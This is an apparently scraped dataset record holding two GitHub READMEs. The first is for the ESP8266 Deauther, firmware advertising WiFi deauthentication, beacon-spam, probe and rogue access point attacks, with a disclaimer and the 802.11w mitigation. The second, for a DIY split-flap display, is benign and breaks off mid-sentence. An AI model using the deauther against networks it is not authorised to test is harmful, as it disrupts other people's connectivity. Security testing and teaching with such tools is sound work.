{"interestingcomments": [{"Unnamed: 0": 2044, "autor": 4, "date": null, "content": "ESP8266 Deauther Version 2\nScan for WiFi devices, block selected connections, create dozens of networks and confuse WiFi scanners!\nDifference to Version 3\nVersion 3 is in development. It is stable to use, but it is very different.\nIt is command line based, which allows it to offer not just more features, but make them more customizable.\nFeature Version 2 Version 3\nWeb Interface \u2705\nDisplay support \u2705\nSerial Command Line \u2705 \u2705\nScanner \u2705 \u2705\nDeauth attack \u2705 \u2705\nBeacon attack \u2705 \u2705\nProbe attack \u2705 \u2705\nHuhnitor support \u2705\nSignal strength scanner \u2705\nAuthentication scanner \u2705\nRogue AP \u2705\nInstallation\nPlease refer to the installation guide in our wiki.\nIf you're just looking for the .bin files, go to releases.\nAbout this project\nThis software allows you to easily perform a variety of actions to test 802.11 wireless networks by using an inexpensive ESP8266 WiFi SoC (System On A Chip).\nThe main feature, the deauthentication attack, is used to disconnect devices from their WiFi network.\nNo one seems to care about this huge vulnerability in the official 802.11 WiFi standard, so I took action and enabled everyone who has less than 10 USD to spare to recreate this project.\nI hope it raises more attention on the issue. In 2009 the WiFi Alliance actually fixed the problem (see 802.11w), but only a few companies implemented it into their devices and software.\nTo effectively prevent a deauthentication attack, both client and access point must support the 802.11w standard with protected management frames (PMF).\nWhile most client devices seem to support it when the access point forces it, basically no WiFi access point has it enabled.\nFeel free to test your hardware out, annoy these companies with the problem, share this project and push for a fix! This project is also a great way to learn more about WiFi, micro controllers, Arduino, hacking and electronics/programming in general.\nBut please use this tool responsibly and do not use it against others without their permission!\nWiFi Jammer\nMany refer to this project as a WiFi jammer. This is problematic, because this firmware is not turning your ESP8266 into a radio or frequency jammer. But this is how most people imagine it without further explaination.\nSo if you like to learn more about the difference, we made a whole video about it:\nSupported Development Boards\nThis firmware can run on any ESP8266, not however on the ESP32!\nThe most popular development boards, the NodeMCU and Wemos d1 mini, work great for this project.\nIf you like to support our work, you can buy get a boards made with this project in mind.\nThey come preflashed with the firmware, so you can start right away.\nYou can chose between:\nSpacehuhn Store:\nOur very own store where all revenue goes directly to us and towards the development of new and exciting projects :)\nWe manufacture and ship from Germany.\nMaltronics:\nWe partnered with Maltronics to bring you high quality hacking gadgets.\nThey are based in the UK.\nDSTIKE:\nDSTIKE was our first partner. They manufactured the first official deauther boards.\nThey offer a wide range of deauthers in a variety of form factors, including a smart watch.\nThey are based in China, but their products are available through a variety of stores:\nTindie\nAliExpress\nTaobao\nDisclaimer\nThis project is a proof of concept for testing and educational purposes.\nNeither the ESP8266, nor its SDK was meant or built for such purposes. Bugs can occur!\nUse it only against your own networks and devices!\nPlease check the legal regulations in your country before using it.\nWe don't take any responsibility for what you do with this program.\nAcknowledgements\nA huge thanks to:\n@deantonious\n@jLynx\n@lspoplove\n@schinfo\n@tobozo\n@xdavidhu\n@PwnKitteh\nfor helping out with various things regarding this project and keeping it alive!\nAlso thanks to everyone working on the libraries used for this project:\nesp8266-oled-ssd1306\nArduinoJson\nAdafruit_DotStar\nAdafruit_NeoPixel\nDS3231\nmy92xx\nWe also thank Espressif and their community for this awesome chip and all the software and hardware projects around it and the countless tutorials you can find online!\nLicense\nThis software is licensed under the MIT License. See the license file for details.", "link": "https://github.com/SpacehuhnTech/esp8266_deauther", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp8266 deauther version 2\nscan for wifi devices, block selected connections, create dozens of networks and confuse wifi scanners!\ndifference to version 3\nversion 3 is in development. it is stable to use, but it is very different.\nit is command line based, which allows it to offer not just more features, but make them more customizable.\nfeature version 2 version 3\nweb interface \u2705\ndisplay support \u2705\nserial command line \u2705 \u2705\nscanner \u2705 \u2705\ndeauth attack \u2705 \u2705\nbeacon attack \u2705 \u2705\nprobe attack \u2705 \u2705\nhuhnitor support \u2705\nsignal strength scanner \u2705\nauthentication scanner \u2705\nrogue ap \u2705\ninstallation\nplease refer to the installation guide in our wiki.\nif you're just looking for the .bin files, go to releases.\nabout this project\nthis software allows you to easily perform a variety of actions to test 802.11 wireless networks by using an inexpensive esp8266 wifi soc (system on a chip).\nthe main feature, the deauthentication attack, is used to disconnect devices from their wifi network.\nno one seems to care about this huge vulnerability in the official 802.11 wifi standard, so i took action and enabled everyone who has less than 10 usd to spare to recreate this project.\ni hope it raises more attention on the issue. in 2009 the wifi alliance actually fixed the problem (see 802.11w), but only a few companies implemented it into their devices and software.\nto effectively prevent a deauthentication attack, both client and access point must support the 802.11w standard with protected management frames (pmf).\nwhile most client devices seem to support it when the access point forces it, basically no wifi access point has it enabled.\nfeel free to test your hardware out, annoy these companies with the problem, share this project and push for a fix! this project is also a great way to learn more about wifi, micro controllers, arduino, hacking and electronics/programming in general.\nbut please use this -----> tool !!!  responsibly and do not use it against others without their permission!\nwifi jammer\nmany refer to this project as a wifi jammer. this is problematic, because this firmware is not turning your esp8266 into a radio or frequency jammer. but this is how most people imagine it without further explaination.\nso if you like to learn more about the difference, we made a whole video about it:\nsupported development boards\nthis firmware can run on any esp8266, not however on the esp32!\nthe most popular development boards, the nodemcu and wemos d1 mini, work great for this project.\nif you like to support our work, you can buy get a boards made with this project in mind.\nthey come preflashed with the firmware, so you can start right away.\nyou can chose between:\nspacehuhn store:\nour very own store where all revenue goes directly to us and towards the development of new and exciting projects :)\nwe manufacture and ship from germany.\nmaltronics:\nwe partnered with maltronics to bring you high quality hacking gadgets.\nthey are based in the uk.\ndstike:\ndstike was our first partner. they manufactured the first official deauther boards.\nthey offer a wide range of deauthers in a variety of form factors, including a smart watch.\nthey are based in china, but their products are available through a variety of stores:\ntindie\naliexpress\ntaobao\ndisclaimer\nthis project is a proof of concept for testing and educational purposes.\nneither the esp8266, nor its sdk was meant or built for such purposes. bugs can occur!\nuse it only against your own networks and devices!\nplease check the legal regulations in your country before using it.\nwe don't take any responsibility for what you do with this program.\nacknowledgements\na huge thanks to:\n@deantonious\n@jlynx\n@lspoplove\n@schinfo\n@tobozo\n@xdavidhu\n@pwnkitteh\nfor helping out with various things regarding this project and keeping it alive!\nalso thanks to everyone working on the libraries used for this project:\nesp8266-oled-ssd1306\narduinojson\nadafruit_dotstar\nadafruit_neopixel\nds3231\nmy92xx\nwe also thank espressif and their community for this awesome chip and all the software and hardware projects around it and the countless tutorials you can find online!\nlicense\nthis software is licensed under the mit license. see the license file for details.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000004, "year": null}, {"Unnamed: 0": 2064, "autor": 24, "date": null, "content": "DIY Split-Flap Display\nThis is a DIY split-flap display. Prototype four-character display: video.\nThe goal is to make a low-cost display that's easy to fabricate at home in small/single quantities (e.g. custom materials can be ordered from Ponoko or similar, and other hardware is generally available).\nYou can view an interactive 3d model of the design on the project website.\nThe splitflap community Slack group is the best place to keep up with the latest changes or ask questions about the project!\nWant to help support development or just say \"thanks\"? Consider a one-time or monthly sponsorship:\n\u2764\ufe0f Sponsor scottbez1 on GitHub\nUsing this project in a commercial setting or for paid client work? Go right ahead - it's open source (just make sure to follow the terms of the Apache License)! I would, however, ask that you consider sponsoring the project. I've been developing and maintaining this project in my free time for over 6 years, and I'd love to continue working on it. Sponsorships allow me to pay for prototypes and development tools that make this project possible. Unlike pure software projects, every iteration has real hardware costs; sponsorships allow me to keep iterating and improving the project faster. Thank you!\nCurrent Status\nYou can download the latest stable release from the official 'releases' page.\nReleases have been tested and used to produce working units, but as this is a continuously evolving open-source project, there may always be minor issues and/or incomplete documentation from time to time.\nComponent Status Notes\nEnclosure/Mechanics Stable\nClassic Controller Electronics Stable\nFirmware Stable\nControl Software Example Stable Example python code for driving the display is in the software directory\n\ud83d\udca1 There's a new electronics system, called the Chainlink system (more on this below), which makes assembly easier and supports larger displays (100+ modules), using an ESP32 for the controller. It's a stable design and will become the recommended electronics in the near future (Q1 2022), but documentation is still in progress so you may hit more bumps in the road for now.\nHere's a video of a large 108-module display powered by 18 Chainlink Driver boards and a Chainlink Base:\nI'd love to hear your thoughts and questions about this project, and happy to incorporate any feedback you might have into these designs! Please feel free (and encouraged) to open GitHub issues, email me directly, reach out on Twitter, and get involved in the open source development and let's keep chatting and building together!\nBuild Your Own\nOrdering guide (v0.5/0.6/0.7)\nLatest stable release\nAssembly instructions (v0.5/0.6/0.7)\nTable of Contents\nRough Cost Breakdown\nHousing\nHardware & Consumables\nFlaps\nPCB\nElectronics & Motor\nDesign Overview\nMechanical\nElectronics\nModule Electronics\nClassic Controller Electronics\nChainlink Electronics\nChainlink Driver\nChainlink Buddy [T-Display]\nChainlink Buddy [Breadboard]\nChainlink Base\nMiscellaneous Tools\nFlaps and Fonts\n3D Printed Tools\nChainlink Driver Tester\nCode\nFirmware\nComputer Control Software\nContributing/Modifying\n3D Design\nElectronics Design\nRough Cost Breakdown\nThis is an incomplete list of supplies needed to build a split-flap display module to get a rough sense of the overall cost. Many items have minimum package sizes, so per-unit-prices will be higher when building fewer units due to the need to buy more items than will actually be used.\nEach section includes a subtotal based on building 4 modules, which is a relatively economical compromise where shipping costs and MOQs no longer dominate the cost.\nOverall, expect to spend somewhere around $200 to $250 for 4 standard 40-character modules.\nHousing\nThe laser-cut housing/mechanics can be ordered from Ponoko (high quality, US-based) or Elecrow. Or you can cut it yourself if you have a laser-cutter capable of cutting 3mm MDF or acrylic.\nPonoko\nPrice Units per order Name Supplier Notes\n$52.97 4 4x MDF 3 mm, laser-cut, shipping Ponoko\n$14 N/A Setup fee Ponoko\nTotal: $16.75 per unit (at 4 units)\nElecrow\nPrice Units per order Name Supplier Notes\n$15 5 Wood laser cut, 3 mm, no engraving Elecrow\n$22 5 Shipping Elecrow\nTotal: $9.25 per unit (at 4 units)\nHardware & Consumables\nPrice Units per order Name Supplier Notes\n$5-10 4 50 pack M4-10 Button-Head Hex Screw Many options 11 screws needed per unit\n$5-10 4 50 pack M4 Hex Nut Many options 11 nuts needed per unit\nTotal: $2.50-5.00 per unit (at 4 units)\nFlaps\nThere are two options for flaps: hand-cut or professionally die-cut.\nHand-Cut (Option 1)\nEach card needs to be cut in half and then have two pieces punched out of either side. Each display unit requires 40 flaps, or 20 cards per unit. 100 cards is enough for 5 units in theory, but 4 in practice because there are no spares for mistakes.\nPrice Units per order Name Supplier Notes\n$14 4 Blank white CR80 cards Amazon One package ($14) covers 4 units\n$9.17 N/A Badge slot punch tool Amazon One-time, up front cost\n$7 2 Vinyl letter stickers Amazon One package ($7) covers 2 units\nTotal: $7.00 per unit (at 4 units) + $9.17 upfront for the punch tool + a lot of time and effort\nDie-Cut (Option 2)\nThese professional die-cut flaps are manufactured specifically for this project (no manual cutting/punching required) and come in both white and matte black. Sold by Bezek Labs, so proceeds help support continued development on this project.\nPrice Units per order Name Supplier Notes\n$53 4 Die-cut flaps Etsy - BezekLabs One package ($45 + shipping) covers 4 units\n$7 2 Vinyl letter stickers Amazon One package ($7) covers 2 units\nTotal: $16.75 per unit (at 4 units)\nPCB\nCircuit boards are available either in small quantities from the Bezek Labs store, or in bulk from PCB manufacturers such as SeeedStudio.\nEtsy - BezekLabs\nPrice Units per order Name Supplier Notes\n$3.99 4 Controller PCB Etsy - BezekLabs One PCB supports 4 units\n$2.99 4 Sensor PCB set Etsy - BezekLabs 4 PCBs per package\nTotal: $1.75 per unit (at 4 units)\nSeeedStudio (Bulk)\nPrice Units per order Name Supplier Notes\n$5 80 Controller PCB SeeedStudio 20 PCBs per order, 4 units per PCB\n$5 200 Sensor PCB SeeedStudio\n$15 Shipping Combined shipping for both items\nTotal: $6.25 per unit (at 4 units), or as low as $0.32 per unit (at 80 units)\nElectronics & Motor\nPrice Units per order Name Supplier Notes\n$14.00 4 Controller board components DigiKey One PCB supports 4 units\n$2.00 1 Sensor board components DigiKey\n$2.00 1 28byj-48 motor (12V preferred) AliExpress See motor notes for details\n$10.00 10 3-pin servo cable (male to male) Amazon or AliExpress\n$11.00 Up to 12 12V power supply Amazon One per display (up to 12 units)\nTotal: $5.00 per unit (motor, sensor components, cable) + $14.00 per 4 units (controller components) + $11.00 per display (up to 12 units)\nYou can find a more detailed breakout of electronics' bill of materials (BOM) in the ordering instructions.\nDesign Overview\nMechanical\nThe mechanical/structural components are made from laser-cut 3mm MDF or acrylic, and held together with M4 bolts and nuts. The design is parametric and built using OpenSCAD. See below for more info on rendering/modifying the design.\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nFor Ponoko 3mm MDF (1x svg, 4x svg)\nFor Ponoko 3mm acrylic (1x svg, 4x svg,)\nFor generic material (0.18mm kerf correction) (1x svg)\nFor Elecrow 3mm Wood (1x zipped pdf, note that Elecrow orders are automatically 5x)\nFor Elecrow 3mm Acrylic (1x zipped pdf, note that Elecrow orders are automatically 5x)\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nElectronics\nThe current recommended approach is the Classic controller board, which plugs into an Arduino Uno as a shield and can control up to 4 modules. Up to 2 additional Classic controller boards can be chained using ribbon cables for a total of up to 12 modules controlled by a single Arduino Uno.\nFor small displays (up to 3 modules), you can skip the custom controller boards and use off-the-shelf ULN2003A driver modules plugged into an Arduino Uno. This is partially documented in the wiki but may require some additional tinkering to get it to work. Help wanted: if you'd like to help improve these instructions, please reach out in the Slack group, thanks!\nA new electronics design (Chainlink) is now available, which allows for larger-scale displays by chaining more modules together and uses a more powerful microcontroller (ESP32). This also adds the possibility of wifi and BLE control, though this isn't currently implemented in firmware yet. For the latest on the Chainlink system, join the Slack group.\nModule Electronics\nEach module needs a hall-effect sensor for start-up calibration and fault monitoring. This can be mounted in different ways but the recommended approach is to use a small PCB, with an AH3391Q (or similar) sensor and connector, which mounts to the side of the module with a single screw and can easily be adjusted for precise calibration.\nThese boards are small (about 16mm x 16 mm) and the designs are available as a panelized PCB, which can be snapped apart. The panelization is configurable and is optimized for production at low-cost PCB fabricators like SeeedStudio, JLCPCB, or PCBWay.\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSensor PCB, single (gerbers / pdf)\nSensor PCB, panelized (gerbers / pdf)\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nClassic Controller Electronics\nThe Classic driver board is designed to plug into an Arduino like a shield, and can control 4 stepper motors. Up to 3 driver boards can be chained together, for up to 12 modules controlled by a single Arduino. The designs for the controller can be found under electronics/splitflap.pro (KiCad 4 project). Nearly everything is a through-hole component rather than SMD, so it's very easy to hand-solder.\nThe driver uses 2 MIC5842 low-side shift-register drivers, with built-in transient-suppression diodes, to control the motors, and a 74HC165 shift register to read from 4 hall-effect magnetic home position sensors. There are optional WS2812B RGB LEDs which can be used to indicate the status of each of the 4 channels.\nThe PCB layout is 10cm x 5cm which makes it fairly cheap to produce using a low-cost PCB manufacturer (e.g. Seeed Studio).\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nBill of Materials (csv, interactive)\nPCB (gerbers / pdf)\nPanelized PCB (gerbers / pdf)\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nChainlink Electronics\nThe Chainlink system is an upcoming alternative to the Classic controller/driver, which is designed to be easier and cheaper to build, especially in higher quantities due to its simplified BOM and surface-mount components. It's also designed to support longer chains of driver boards to control large displays (think 100+ split-flap modules).\nChainlink is stable and will become the recommended electronics system in the near future, but documentation is still in progress so there is not an easy guide for ordering/building it yet.\nThe Chainlink system requires 2 core elements:\nOne or more Chainlink Driver board accepts data and power and each Driver connects to 6 individual split-flap modules. Chainlink Driver boards can be chained together to construct a large display.\nSome kind of ESP32 microcontroller board. There are a few options:\nFor small/medium displays, one of the Chainlink Buddy boards are recommended\nChainlink Buddy [T-Display] holds a Lilygo T-Display ESP32 module which includes a built-in LCD and 2 buttons\nChainlink Buddy [Breadboard] makes it easy to connect a Chainlink Driver to a breadboard for prototyping, though you can also easily connect a Chainlink Driver to a breadboard with a few dupont wires.\nFor large displays, the Chainlink Base provides a number of advanced features: central power management/distribution and fault monitoring, UART and RS-485 connections, configuration switches, and status LEDs.\nChainlink Driver\nKey features (vs Classic Controller):\nControls 6 split-flap modules per board instead of just 4 - fewer PCBs means lower cost and less wiring\nLonger PCB (200mm) gets connectors closer to each module so wires have more slack\nPrimarily SMD and all components (except the pin headers and motor connectors) are available in JLCPCB's parts library for easy SMD/THT assembly\nClock and latch lines are buffered on each board with a 74HC125 to support longer chains\nNeopixels replaced by shift-register-driven single-color LED per module (one fewer data line needed in the chain, lower current draw, and 3.3v IO friendly)\n2 bits of loopback (connecting 2 spare output bits on output shift registers to 2 spare inputs) allows the controller to validate data integrity up and down the whole chain\nTPL7407L mosfet low-side drivers instead of ULN2003A/MIC5842 (lower on-resistance means less voltage drop in the driver = more torque, less waste heat, and less total current consumption) Due to the chip shortage, TPL7407L ICs are not currently available and will likely not be available again until mid-2022, so the auto-generated JLC component/bom files below currently use ULN2003A darlington drivers as a suitable drop-in replacement.\nModule order goes from right-to-left since this is intended to be installed and accessed from behind the modules\nChainlink Driver boards are available mostly-assembled in the Bezek Labs store, and come with the additional connectors and ribbon cables you'll need. Purchases support continued development of this project.\nMore information on building and using Chainlink Drivers is available in the Chainlink Driver User Guide.\nOr if you'd like to order these directly from a fab, this design is optimized for assembly at JLCPCB, and files are automatically generated for ordering assembled PCBs there. Or if you wish to assemble this board yourself instead of paying for assembly, you can view the interactive BOM/placement tool\nDepending on available stock at JLCPCB, you may need to manually modify the BOM file to use alternative components, or regenerate the files yourself using export_jlcpcb.py and specifying one or more LCSC_ALT_* field names to use a pre-selected alternative part number. See the schematic for available pre-selected alternatives (check the symbol's properties/fields).\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSchematic pdf\nPCB overview pdf\nPCB gerbers zip\nPCB bom (for JLCPCB assembly) csv\nPCB CPL (for JLCPCB assembly) csv\nPCB bom (for manual assembly) interactive\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nChainlink Buddy [T-Display]\nThe Chainlink Buddy [T-Display] is a convenient way to connect a T-Display ESP32 board (recommended microcontroller) to a chain of Chainlink Drivers.\nKey features:\nTTGO T-Display ESP32 module as the controller, which includes USB-C, color IPS LCD display and buttons\nExtra terminals for every pin of the T-Display allow you to connect any other peripherals to the ESP32 (the connection to the Chainlink Driver requires only 4 of the GPIOs)\nOptional barrel jack makes it easy to use a \"wall wart\" AC adapter/power-supply (since the Chainlink Driver only has screw terminals for power) -- plug in a 12V supply and then run a wire from the onboard screw terminals to the Chainlink Driver's motor power screw terminals.\nOptional 5V regulator allows for powering the ESP32 without a USB connection, using the 12V motor power supply\nChainlink Buddy [T-Display] boards are available in the Bezek Labs store, and come with the additional connectors you'll need. Purchases support continued development of this project.\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSchematic pdf\nPCB (gerbers / pdf)\nPanelized PCB (gerbers / pdf)\nPCB bom (for manual assembly) interactive\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nChainlink Buddy [Breadboard]\nThe Chainlink Buddy [Breadboard] makes it easy to connect a Chainlink Driver to a breadboard for prototyping. You could use 5 dupont wires and have a messy rats nest, or you could use a single ribbon cable and this slick breakout board.\nChainlink Buddy [Breadboard] boards are available in the Bezek Labs store, and come with the additional connectors you'll need. Purchases support continued development of this project.\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSchematic pdf\nPCB (gerbers / pdf)\nPanelized PCB (gerbers / pdf)\nPCB bom (for manual assembly) interactive\n\u26a0\ufe0fFor tested/stable/recommended artifacts, use the latest release instead\nChainlink Base\nThis is currently under very active development. It has been tested and appears to work, but is not yet recommended for general use. Firmware support is in progress.\nThe Chainlink Base PCB is an optional component of the Chainlink system, designed for particularly large displays. It hosts the ESP32 and adds additional connectivity options (terminals for UART and RS485 serial) and power distribution (independently-monitored power channels for multiple \"zones\" of Driver boards).\nI would generally recommend wiring an ESP32 directly rather than using a Chainlink Base PCB unless you are building a large (50+ module) display.\nKey features:\nTTGO T-Display ESP32 module as the controller, which includes USB-C, color IPS LCD display and buttons\nOptional master relay output for 12V PSU control (5V relay, up to ~500mA coil current)\nFuture firmware will power on the 12V PSU after a startup self-test, and power off PSU in case of any faults\n5 channels of independently monitored 12V switches for powering groups of Chainlink Driver boards (6-10A max per channel)\nDepending on the motors you use, each channel may be able to power about 6 Chainlink Driver boards which is 36 splitflap modules\nEach channel includes an automotive fuse holder for additional over-current protection\nINA219 and shunt resistor provide high fidelity voltage and current monitoring\nFirmware will power on each channel after a startup self-test, and power off the channel in case of any faults\n3.3V output for powering many Chainlink Driver boards\nFlexible controller input power\nUSB power from the T-Display works by default, though external power is recommended for larger displays\nRegulated 5V can be connected directly to the screw terminals, or\nif you are using an always-on 12V PSU without a master relay, you can install a buck module and power the board from 12V using the 7-28V screw terminals\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSchematic pdf\nPCB overview pdf\nPCB gerbers zip\nPCB bom (for manual assembly) interactive\n\u26a0\ufe0fThere are currently no stable releases of this board. Once the board design is tested and recommended, a stable release will be created on the Releases dashboard\nMiscellaneous Tools\nFlaps and Fonts\nIf you'd like to print your own flaps, or cut custom vinyl letter stickers, the project includes a script to generate vector design files that is extremely configurable:\nFont for text (this is further customizable in OpenSCAD)\nCharacter-set - which letters/numbers/symbols/colors are included and in what order\nBleed - extends rendering past the borders of the flaps to compensate for slight misalignment of printing and cutting operations\nKeepout areas - option to highlight keepout violations for manual review, automatically clip them, or ignore them\nRendering options:\nSingle-sided - useful for previewing how all letters will look on flaps\nFront/back - for batch duplex printing, generate separate front-side and back-side files (e.g. sign shop printing on a flat sheet of PVC)\nSide-by-side - for individual flap printing, each flap's front design is laid out side-by-side with its back design\nTODO: finish documenting this and render some example images...\n3D Printed Tools\nThe project also includes a number of optional 3D printed designs to make assembly easier. These include:\na flap scoring jig for precisely marking the cut point when splitting CR80 cards\na flap punch jig for aligning the punch when making the pin cutouts on either side of a flap\na flap container for storing and organizing stacks of completed flaps\na sensor PCB holder for storing and protecting soldered sensor boards\nAll of these designs are parametric and customizable within OpenSCAD. To print them, open up the relevant file in OpenSCAD and use File -> Export -> Export as STL to render the design as an STL file for your slicer.\nChainlink Driver Tester\nThis is not likely to be useful unless you're planning to manufacture dozens to hundreds of Chainlink Driver boards, but the Chainlink Driver Tester is a complete testbed for Chainlink Driver boards as they come assembled by the PCBA fabricator.\nThis is currently under very active development.\nKey features:\nTTGO T-Display (ESP32) controller, screen, and buttons for controlling tests and reporting results\nPogo-pins for all connectors on the Chainlink Driver board-under-test (screw terminals, sensor pin headers, and motor connectors)\n12V switch to supply motor power to the board-under-test, with automotive fuse and INA219 voltage/current monitoring (based on the Chainlink Base channel switch design)\nSeparate 3.3V supply for the board-under-test, protected with a polyfuse, should avoid browning out the Tester's MCU in case of 3.3V short-circuits\nMotor and sensor connections are broken out from the pogo-pins for a full closed-loop hardware test\nScrew terminals to chain another Chainlink Driver (not under test) to validate that chained outputs work on the board-under-test\nMCP23017 GPIO expander with 8 GPIO pins exposed via headers for future expansion inputs\nLarge cutout allows a barcode scanner or camera to be aimed at the bottom of the board-under-test for tracking serial numbers.\nBuzzer option for audible pass/fail feedback\nLatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nSchematic pdf\nPCB overview pdf\nPCB gerbers zip\nPCB bom (for manual assembly) interactive\n\u26a0\ufe0fThere are currently no stable releases of this board, and there may never be as it is a niche production tool, not an end product. If you need this tool, you are likely actively involved in development and should understand the revision history and current status of development enough to make an informed decision about which revision(s) to use.\nCode\nFirmware\nThe driver firmware is written using Arduino and is available at arduino/splitflap/Splitflap/Splitflap.ino.\nThe firmware implements a closed-loop controller that accepts letters as input over USB serial and drives the stepper motors using a precomputed acceleration ramp for smooth control. The firmware automatically calibrates the spool position at startup, using the hall-effect magnetic sensor, and will automatically recalibrate itself if it ever detects that the spool position has gotten out of sync. If a commanded rotation is expected to bring the spool past the \"home\" position, it will confirm that the sensor is triggered neither too early nor too late; otherwise it will search for the \"home\" position to get in sync before continuing to the desired letter.\nComputer Control Software\nThe display can be controlled by a computer connected to the Arduino over USB serial. A basic python library for interfacing with the Arduino and a demo application that displays random words can be found in the software directory.\nCommands to the display are sent in a basic plain-text format, and messages from the display are single-line JSON objects, always with a type entry describing which type of message it is.\nWhen the Arduino starts up, it sends an initialization message that looks like:\n{\"type\":\"init\", \"num_modules\":4}\nThe display will automatically calibrate all modules, and when complete it will send a status update message:\n{\n\"type\":\"status\",\n\"modules\":[\n{\"state\":\"normal\", \"flap\":\" \", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0}\n]\n}\n(Note: this is sent as a single line, but has been reformatted for readability above)\nIn this case the Arduino was programmed to support 4 modules, but only 1 module is connected, so the other 3 end up in \"sensor_error\" state. More on status updates below.\nAt this point you can command the display to show some letters. To do this, send a message to the Arduino that looks like this:\n=hiya\\n\nThe = indicates a movement command, followed by any number of letters, followed by a newline. You don't have to send the exact number of modules - if you send fewer letters than modules, only the first N modules will be updated and the remainder won't move. For instance, you could send =a\\n as shorthand to only set the first module (even if there are 12 modules connected). Any letters that can't be displayed are considered a no-op for that module.\nWhenever ALL modules come to a stop, the Arduino will send a status update message (just like the one following initialization, shown above). Here's what the fields mean in each module's status entry:\nstate - normal indicates it's working as intended, sensor_error indicates the module can't find the home position and has given up trying (it will no longer respond to movement commands until told to recalibrate - see below). panic indicates the firmware detected a programming bug and has gone into failsafe mode (it will no longer respond to movement commands and requires a full reset of the Arduino to recover - should never happen).\nflap - which letter is shown by this module\ncount_missed_home - number of times the module expected to pass the home position but failed to detect it. If this is non-zero, it indicates either a flaky sensor or that the motor may have jammed up. The module automatically attempts to recalibrate whenever it misses the home position, so if this number is non-zero and the module is still in the normal state, it means the module successfully recovered from the issue(s). However, if this number keeps going up over continued use, it may indicate a recurrent transient issue that warrants investigation.\ncount_unexpected_home - number of times the module detected the home position when it wasn't supposed to. This is rare, but would indicate a flaky/broken sensor that is tripping at the wrong time. Just like with missed home errors, unexpected home errors will cause the module to attempt to recalibrate itself.\nIf you want to make all modules recalibrate their home position, send a single @ symbol (no newline follows):\n@\nThis recalibrates all modules, including any that were in the sensor_error state; if recalibration succeeds they will return to the normal state and start responding to movement commands again.\nContributing/Modifying\nLooking to make some modifications or play around with the design on your local machine? Jump right in! Note that all of the scripts and automation are developed for Ubuntu. Mac OS support is planned, but not currently implemented (but feel free to open a PR if you want to help!).\n3D Design\nThe main design file is 3d/splitflap.scad\nYou'll need a recent version of OpenSCAD (e.g. 2015-03), which may need to be installed through the PPA: sudo add-apt-repository ppa:openscad/releases\nIn general, solid objects such as the enclosure sides or spool components are built from 2d primitives and then extruded to the appropriate thickness for 3d rendering, rather than using 3d primitives. This simplifies the design without losing expressiveness; the perpendicular laser cut beam doesn't allow for cuts that vary in the Z dimension anyway.\nNote that while the design is parameterized and many values may be tweaked, there is currently no error checking for invalid parameters or combinations of parameters. Please take care to validate the design if you change any parameters. For instance, while most of the design will adjust to a changed num_modules value, certain values may cause some elements to intersect with other elements or protrude beyond their expected dimensions.\nRendering\nLaser-cut vector files\nThe design can be rendered to 2d for laser cutting by running 3d/scripts/generate_2d.py [--panelize <number>], which outputs to 3d/build/laser_parts/combined.svg. The optional --panelize argument allows for rendering a panel of modules in a single SVG, for bulk laser-cutting.\nInternally, the design uses a projection_renderer module (3d/projection_renderer.scad), which takes a list of child elements to render, and depending on the render_index renders a single child at a time. It also adds material to each shape to account for the kerf that will be cut away by the laser.\nThe generate_2d.py script interacts with the projection_renderer module by first using it to determine the number of subcomponents to render, then runs OpenSCAD to export each component to an SVG file. It does some post-processing on the SVG output (notably adds \"mm\" to the document dimensions), and then combines all components into the single combined.svg output.\nOnce the combined.svg file is generated, you'll want to double-check there aren't any redundant cut lines that are shared by multiple adjacent pieces, to save time/cost when cutting. They should be detected automatically (and highlighted in red in the rendering above), but it doesn't hurt to double-check. In Inkscape, select the \"Edit paths by nodes\" tool and select an edge to delete - the endpoints should turn blue. Then click \"Delete segment between two non-endpoint nodes\", and repeat this for all other redundant cut lines.\nAnimated gif\nThe design can be rendered to a rotating 3d animated gif (seen above) by running 3d/scripts/generate_gif.py, which outputs to 3d/build/animation/animation.gif\nThe generate_gif.py script runs multiple OpenSCAD instances in parallel to render the design from 360 degrees to individual png frames, which are then combined into the final gif animation. As part of building the animation, generate_gif.py renders the design with multiple configurations (opaque enclosure, see-through enclosure, no-enclosure and no flaps) by setting the render_enclosure and render_flaps variables.\nSTL models/web viewer\nThe design can be rendered to a series of STL files (one per color used in the model) in order to be displayed in an interactive web-based 3d viewer. Similar to the projection_renderer used to render individual components for laser-cutting, the ColoredStlExporter detects all the colors used in the model and renders them one-by-one to separate STL files, along with a manifest that maps each STL file to its RGB color. The STL files and manifest are loaded using three.js to display an interactive model on a web site using WebGL. See this blog post for more details on how the export and three.js renderer work: OpenSCAD Rendering Tricks, Part 3: Web viewer.\nElectronics Design\nAll of the electronics are developed using KiCad 5. Panelization is provided by KiKit and gerber/BOM generation is provided by KiBot.\nRendering\nThe mechanical and electrical design renderings and links above are automatically updated on every commit with the latest rendering. See this blog post for more details on how that works: Automated KiCad, OpenSCAD rendering using Travis CI.\nThe PCB layout can be rendered to an svg or png (seen above) by running electronics/scripts/generate_svg.py file.kicad_pcb. This uses KiCad's Python scripting API to render several layers to individual svg files, manipulates them to apply color and opacity settings, and then merges them to a single svg. For additional details, see this blog post: Scripting KiCad Pcbnew exports.\nFor reviewing the design, a pdf packet with copper, silkscreen, and 